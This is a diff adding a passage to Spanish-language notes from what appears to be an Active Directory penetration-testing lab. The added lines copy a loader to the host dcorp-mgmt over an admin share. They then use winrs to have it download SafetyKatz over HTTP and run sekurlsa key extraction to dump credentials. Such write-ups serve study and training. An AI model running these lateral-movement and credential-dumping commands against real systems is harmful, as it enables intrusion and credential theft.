@@ -690,4 +690,14 @@ Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 
 Obteniendo como respuesta que tenemos privilegios de administrador en *dcorp-mgmt*
 Tambien sabemos que en esa maquina tambien esta presente una sesion de *dcorp-svcadmin*.
-Utilizaremos *SafetyKatz*
+Utilizaremos *SafetyKatz* para extraer las credenciales de la maquina *dcorp-mgmt*, primero nos transferiremos el *Loader* a la maquina
+```shell
+[newShell as srvadmin privileges]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
+```shell
+winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
+```
+
